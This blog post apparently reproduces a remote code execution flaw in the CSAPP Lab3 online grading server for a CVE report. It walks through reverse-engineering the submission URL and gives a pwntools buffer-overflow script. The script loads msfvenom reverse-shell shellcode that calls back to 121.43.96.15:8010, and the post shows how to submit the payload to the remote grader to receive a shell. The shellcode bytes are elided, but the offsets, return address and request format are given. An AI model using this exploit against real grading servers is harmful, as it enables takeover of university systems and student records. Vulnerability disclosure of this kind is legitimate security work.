---
title: Reproduction of CSAPP Lab3 RCE Vulnerability
date: 2024-03-05 14:49:23
categories:
- CVE
tags:
- CVE
---

## **Reproduction of CSAPP Lab3 RCE Vulnerability**

### **Reproduction Environment**
- One server deployed with csapp_lab3
- Possible issues during deployment:
  - If downloaded files have PIE protection enabled, check ~/lab3/src/Makefile and add "-no-pie" to the compilation parameters.
  - If compilation fails, it might be due to a lack of 32-bit libc library.
    ```
    sudo apt update
    sudo dpkg --add-architecture i386
    sudo apt install libc6:i386
    ```
### **Deployment Steps**
1. Navigate to the lab3 folder:
   ```
   $ cd lab3
   ```
2. Modify the configuration file Buflab.pm with the online experiment server's IP and port.
3. Clean all files before online deployment:
   ```
   $ make cleanallfiles
   ```
   **Note:** This will delete all student records, use with caution.
4. Start the online experiment daemon:
   ```
   $ make start
   ```
   The online experiment daemon will start, indicating successful deployment.
5. Stop the online experiment:
   ```
   $ make stop
   ```
   The related programs are stateless servers and can be started and stopped repeatedly.

### **Reproduction Approach**
- The one-click deployed lab3 can be accessed via port 18213, providing a submission package.
- Reverse engineer this submission package to obtain the submission format and a bufbomb experiment package that matches the remote grading program.
- Test locally to overflow bufbomb, execute shellcode, and bounce a shell from Metasploit (msf).
- Based on the submission format, submit the payload to the server, wait for it to run, and receive the shell.

### **Reverse Engineering**
- Reverse engineer the source code using IDA to obtain the submission format:
  ```
  http://121.43.96.15:18214/csapp/submitr.pl/?userid=<student_id>&lab=<any_number>&result=1:<cookie>:<output_in_hexadecimal_space_separated_binary>&submit=submit
  ```

### **Shell Execution**
1. Debug the payload to confirm shell execution locally:
   ```
   from pwn import *
   context.log_level = "debug"
   p = process(["./bufbomb", "-u", "2023302646", '-s'])
   
   buf = asm("sub esp,0x300")  # Move the stack pointer away to prevent shellcode corruption
   
   # Shellcode generated from msfvenom to reverse shell to 121.43.96.15:8010
   buf += b"\x...<shellcode>..."
   
   payload = 24 * b'a' + b'b' * 20 + p32(0x0804968F) + buf
   p.sendlineafter(":", payload)
   p.interactive()
   ```

2. Execute the remote shell:
   - Submit the student ID, password, and payload to the submission format. The example below bounces a shell back to the local machine:
     ```
     http://121.43.96.15:18214/csapp/submitr.pl/?userid=2023302646&lab=123&result=1:55daa51a:...<payload>...&submit=submit
     ```

The above reproduction process is intended for CVE submission.
